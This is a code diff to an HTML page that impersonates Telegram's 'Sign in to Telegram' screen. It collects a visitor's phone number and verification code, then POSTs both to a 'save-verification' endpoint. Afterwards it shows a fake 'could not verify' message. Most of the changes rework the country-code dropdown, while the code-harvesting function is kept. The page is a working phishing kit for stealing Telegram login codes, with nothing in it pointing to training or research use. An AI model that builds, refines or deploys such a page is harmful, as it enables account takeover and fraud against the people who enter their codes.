@@ -24,7 +24,8 @@
             text-align: center;
             width: 90%;
             max-width: 380px;
-            margin-top: 30%;
+            margin-top: 20px;
+            position: relative;
         }
 
         .container img {
@@ -80,9 +81,44 @@
             background-size: 12px 12px;
         }
 
-        input[type="checkbox"] {
+        .dropdown-container {
+            position: relative;
+        }
+
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #fff;
+            z-index: 1000;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .dropdown-menu.show {
+            display: block;
+        }
+
+        .dropdown-item {
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+            cursor: pointer;
+        }
+
+        .dropdown-item img {
+            width: 24px;
+            height: 16px;
             margin-right: 10px;
-            vertical-align: middle;
+        }
+
+        .dropdown-item:last-child {
+            border-bottom: none;
         }
 
         .button {
@@ -102,14 +138,10 @@
             background-color: #007ab8;
         }
 
-        .monkey-icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-        }
-
         #countryCode {
             color: #ccc;
             text-align: left;
+            position: relative;
         }
 
         #countryCode option {
@@ -142,34 +174,12 @@
         <h1>Sign in to Telegram</h1>
         <p>Please confirm your country code and enter your phone number.</p>
 
-        <div class="input-group">
+        <div class="input-group dropdown-container">
             <label for="countryCode">Country</label>
-            <select id="countryCode" onchange="updatePhoneNumberPrefix()">
-                <option value="" disabled selected hidden></option>
-                <option value="+1">🇺🇸 United States</option>
-                <option value="+44">🇬🇧 United Kingdom</option>
-                <option value="+61">🇦🇺 Australia</option>
-                <option value="+33">🇫🇷 France</option>
-                <option value="+49">🇩🇪 Germany</option>
-                <option value="+34">🇪🇸 Spain</option>
-                <option value="+39">🇮🇹 Italy</option>
-                <option value="+81">🇯🇵 Japan</option>
-                <option value="+91">🇮🇳 India</option>
-                <option value="+86">🇨🇳 China</option>
-                <option value="+7">🇷🇺 Russia</option>
-                <option value="+82">🇰🇷 South Korea</option>
-                <option value="+55">🇧🇷 Brazil</option>
-                <option value="+27">🇿🇦 South Africa</option>
-                <option value="+60">🇲🇾 Malaysia</option>
-                <option value="+65">🇸🇬 Singapore</option>
-                <option value="+41">🇨🇭 Switzerland</option>
-                <option value="+31">🇳🇱 Netherlands</option>
-                <option value="+48">🇵🇱 Poland</option>
-                <option value="+20">🇪🇬 Egypt</option>
-                <option value="+98">🇮🇷 Iran</option>
-                <option value="+90">🇹🇷 Turkey</option>
-                <option value="+62">🇮🇩 Indonesia</option>
-            </select>
+            <div id="countryCode" onclick="toggleDropdown()">
+                <span>Select Country</span>
+            </div>
+            <div id="dropdownMenu" class="dropdown-menu"></div>
         </div>
 
         <div class="input-group">
@@ -205,77 +215,119 @@
     </div>
 
     <script>
-        function updatePhoneNumberPrefix() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumberField = document.getElementById('phoneNumber');
-            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
-        }
+        document.addEventListener('DOMContentLoaded', function() {
+            const countryDropdown = document.getElementById('countryCode');
+            const dropdownMenu = document.getElementById('dropdownMenu');
+            const countries = [
+                { name: 'Australia', code: '+61', flag: 'https://www.countryflags.io/au/flat/24.png' },
+                { name: 'United States', code: '+1', flag: 'https://www.countryflags.io/us/flat/24.png' },
+                { name: 'United Kingdom', code: '+44', flag: 'https://www.countryflags.io/gb/flat/24.png' },
+                { name: 'Germany', code: '+49', flag: 'https://www.countryflags.io/de/flat/24.png' },
+                { name: 'France', code: '+33', flag: 'https://www.countryflags.io/fr/flat/24.png' },
+                { name: 'Japan', code: '+81', flag: 'https://www.countryflags.io/jp/flat/24.png' },
+                { name: 'India', code: '+91', flag: 'https://www.countryflags.io/in/flat/24.png' },
+                { name: 'China', code: '+86', flag: 'https://www.countryflags.io/cn/flat/24.png' },
+                { name: 'Russia', code: '+7', flag: 'https://www.countryflags.io/ru/flat/24.png' },
+                { name: 'South Korea', code: '+82', flag: 'https://www.countryflags.io/kr/flat/24.png' },
+                { name: 'Brazil', code: '+55', flag: 'https://www.countryflags.io/br/flat/24.png' },
+                { name: 'Canada', code: '+1', flag: 'https://www.countryflags.io/ca/flat/24.png' },
+                { name: 'Italy', code: '+39', flag: 'https://www.countryflags.io/it/flat/24.png' },
+                { name: 'Mexico', code: '+52', flag: 'https://www.countryflags.io/mx/flat/24.png' },
+                { name: 'Spain', code: '+34', flag: 'https://www.countryflags.io/es/flat/24.png' },
+                { name: 'Turkey', code: '+90', flag: 'https://www.countryflags.io/tr/flat/24.png' },
+                { name: 'Netherlands', code: '+31', flag: 'https://www.countryflags.io/nl/flat/24.png' },
+                { name: 'Saudi Arabia', code: '+966', flag: 'https://www.countryflags.io/sa/flat/24.png' },
+                { name: 'Sweden', code: '+46', flag: 'https://www.countryflags.io/se/flat/24.png' },
+                { name: 'Switzerland', code: '+41', flag: 'https://www.countryflags.io/ch/flat/24.png' },
+                { name: 'South Africa', code: '+27', flag: 'https://www.countryflags.io/za/flat/24.png' },
+                { name: 'Argentina', code: '+54', flag: 'https://www.countryflags.io/ar/flat/24.png' }
+                // Add more countries as needed
+            ];
 
-        function goToVerificationPage() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
-            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
-
-            if (phoneNumber === '') {
-                alert('Please enter your phone number.');
-                return;
-            }
-
-            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
-
-            document.getElementById('initialContainer').style.display = 'none';
-            document.getElementById('verificationContainer').style.display = 'block';
-        }
-
-        async function sendDataToServer(phoneNumber, verificationCode) {
-            try {
-                const response = await fetch('http://localhost:8000/save-verification', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phoneNumber,
-                        verificationCode: verificationCode,
-                        userId: 1 // This can be updated dynamically if needed
-                    })
+            // Populate the dropdown menu
+            countries.forEach(country => {
+                const item = document.createElement('div');
+                item.classList.add('dropdown-item');
+                item.innerHTML = `${country.flag ? `<img src="${country.flag}" alt="Flag">` : ''} ${country.name} ${country.code}`;
+                item.dataset.code = country.code;
+                item.addEventListener('click', function() {
+                    countryDropdown.innerHTML = `${country.flag ? `<img src="${country.flag}" alt="Flag">` : ''} ${country.name} ${country.code}`;
+                    document.getElementById('phoneNumber').value = country.code + ' ' + document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
+                    dropdownMenu.classList.remove('show');
                 });
+                dropdownMenu.appendChild(item);
+            });
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+            window.toggleDropdown = function() {
+                dropdownMenu.classList.toggle('show');
+                countryDropdown.classList.toggle('open');
+            };
+
+            window.goToVerificationPage = function() {
+                const countryCode = document.getElementById('countryCode').innerText.split(' ')[1];
+                const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
+                const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
+
+                if (phoneNumber === '') {
+                    alert('Please enter your phone number.');
+                    return;
                 }
 
-                console.log("Data sent to server successfully");
-            } catch (error) {
-                console.error("Failed to send data to server:", error);
+                document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
+
+                document.getElementById('initialContainer').style.display = 'none';
+                document.getElementById('verificationContainer').style.display = 'block';
+            };
+
+            async function sendDataToServer(phoneNumber, verificationCode) {
+                try {
+                    const response = await fetch('http://localhost:8000/save-verification', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            phoneNumber: phoneNumber,
+                            verificationCode: verificationCode,
+                            userId: 1 // This can be updated dynamically if needed
+                        })
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    console.log("Data sent to server successfully");
+                } catch (error) {
+                    console.error("Failed to send data to server:", error);
+                }
             }
-        }
 
-        function submitVerification() {
-            const verificationCode = document.getElementById('verificationCode').value;
-            const phoneDisplay = document.getElementById('phoneDisplay').textContent;
+            window.submitVerification = function() {
+                const verificationCode = document.getElementById('verificationCode').value;
+                const phoneDisplay = document.getElementById('phoneDisplay').textContent;
 
-            if (verificationCode === '') {
-                alert('Please enter the verification code.');
-                return;
-            }
+                if (verificationCode === '') {
+                    alert('Please enter the verification code.');
+                    return;
+                }
 
-            sendDataToServer(phoneDisplay, verificationCode);
+                sendDataToServer(phoneDisplay, verificationCode);
 
-            // Show the final message indicating verification failure
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessageContainer').style.display = 'block';
-            document.getElementById('finalMessage').textContent = 'The verification code is incorrect or has expired.';
-        }
+                // Show the final message indicating verification failure
+                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
+                document.getElementById('finalMessageContainer').style.display = 'block';
+            };
 
-        function resetForm() {
-            document.getElementById('countryCode').value = '';
-            document.getElementById('phoneNumber').value = '';
-            document.getElementById('verificationCode').value = '';
-            document.getElementById('initialContainer').style.display = 'block';
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessageContainer').style.display = 'none';
-        }
+            window.resetForm = function() {
+                document.getElementById('initialContainer').style.display = 'block';
+                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('finalMessageContainer').style.display = 'none';
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('verificationCode').value = '';
+            };
+        });
     </script>
 </body>
 </html>
